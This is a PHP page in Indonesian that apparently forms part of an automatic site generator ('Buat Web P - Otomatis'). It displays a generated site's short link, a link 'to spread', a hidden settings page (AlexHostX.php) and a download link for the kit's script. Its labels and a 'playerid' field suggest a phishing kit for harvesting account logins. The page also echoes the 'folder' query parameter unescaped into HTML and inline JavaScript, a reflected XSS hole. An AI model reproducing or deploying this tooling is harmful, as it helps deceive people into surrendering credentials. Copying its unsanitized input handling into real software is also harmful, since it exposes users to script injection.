<?php
$time = date('d-m-Y');
include 'AlexShortLink.php';
$subdomain = $_GET['folder'];
$domain = $_SERVER['SERVER_NAME'];
$longURL = $domain . '/' . $subdomain;
$shortenedURL = shortenURL($longURL);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" 
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <title>Buat Web P - Otomatisイチジク</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm';
    }
    body {
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
      background: #E2E8F0;
    }
    .gateway {
      position: relative;
      max-width: 600px;
      height: 90vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .gateway span {
      margin-bottom: 20px;
    }
    .gateway .form {
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      padding: 0 20px;
    }
    .gateway .response {
      position: relative;
      width: 100%;
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 0 20px;
      margin-top: 30px;
      gap: 10px;
    }
    .response textarea {
      width: 100%;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .form label {
      position: relative;
      width: 100%;
      display: flex;
      flex-direction: column;
    }
    label select, label input {
      width: 100%;
      border: 1px solid #000;
      border-radius: 5px;
      height: 30px;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
    }
    *:focus {
      outline: none;
    }
    .form button {
      padding: 5px 10px;
      margin-top: 10px;
      background: #faae2b;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    .gateway .source {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: #25D366;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    footer {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .scode {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #fff;
      height: 100%;
      z-index: 9999;
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .scode textarea {
      margin-top: 20px;
      width: 100%;
      height: 100%;
      padding-left: 5px;
      border-radius: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .scode i {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: pink;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    #copyButton {
        position: absolute;
        top: 10px;
        right: 10px;
        padding: 5px 10px;
        background-color: #faae2b;
        border: 1px solid #000;
        border-radius: 3px;
        cursor: pointer;
    }
  </style>
  <script>
        // Fungsi untuk menampilkan elemen berdasarkan pilihan
        function showElement(elementId) {
            // Semua elemen dengan class "hidden" disembunyikan
            var hiddenElements = document.querySelectorAll('.hidden');
            hiddenElements.forEach(function (elem) {
                elem.style.display = 'none';
            });

            // Tampilkan elemen berdasarkan pilihan
            var selectedElement = document.getElementById(elementId);
            selectedElement.style.display = 'block';
        }
    </script>
</head>
<body>
<div class="gateway">
  <div onclick="toggleSource()" class="source">Download Script</div>
  <h1><img src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/z.png" alt="" style="width: 400px;"></h1>
  <div class="form">
  <label> WEB SHORT LINK
      <input name="subdo" type="text" class="playerid form-input" value="<?= $shortenedURL ?>" readonly>
    </label>
    <label> LINK NEBAR
      <input name="subdo" type="text" class="playerid form-input" value="https://<?= $_SERVER['SERVER_NAME'] ?>/<?php echo $_GET['folder']; ?>" readonly>
    </label>
    <label> LINK SETTING
      <input name="subdo" type="text" class="playerid form-input" value="https://<?= $_SERVER['SERVER_NAME'] ?>/<?php echo $_GET['folder']; ?>/AlexHostX.php" readonly>
    </label>
    <label> WAKTU MEMBUAT
      <input name="subdo" type="text" class="playerid form-input" value="<?= $time ?>" readonly>
    </label>
        <button onclick="openLink()">Buka Web</button>
        <button onclick="bukaSetting()">Buka Web Setting</button>
        <button onclick="copyToClipboard('Short Link : <?= $shortenedURL ?>\nWebsite : https://<?= $_SERVER['SERVER_NAME'] ?>/<?= $_GET['folder']; ?>\nWebsite Setting : https://<?= $_SERVER['SERVER_NAME'] ?>/<?= $_GET['folder']; ?>/AlexHostX.php')">Salin Detail Web</button>
  </div>
  </form>
</div>
</div>
</div>
<footer>
  Created By <a href="https://wa.me/62857812008" style="text-decoration: none;margin: 0 10px"> Brutal Zuckerberg </a> With <img width="20" height="20" src="" style="margin-left: 10px">
</footer>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
function toggleSource() {
      window.location = 'https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/.zip';
      }
</script>
</body>
</html>
<script>
    function openLink() {
        window.location.href = "<?php echo $_GET['folder']; ?>";
    }

    function bukaSetting() {
        window.location.href = "<?php echo $_GET['folder']; ?>/AlexHostX.php";
    }
</script>
<script>
    function copyToClipboard(text) {
            navigator.clipboard.writeText(text)
                .then(() => {
                    Swal.fire({
                        title: 'Berhasil!',
                        text: 'Detail web berhasil disalin!',
                        icon: 'success',
                        confirmButtonText: 'OK'
                    });
                })
                .catch(err => {
                    console.error('Gagal menyalin link: ', err);
                    Swal.fire({
                        title: 'Gagal!',
                        text: 'Gagal menyalin link. Silakan coba lagi.',
                        icon: 'error',
                        confirmButtonText: 'OK'
                    });
                });
        }
        document.addEventListener('DOMContentLoaded', function() {
            showWelcomeNotification();
        });
</script>

</body>
</html>
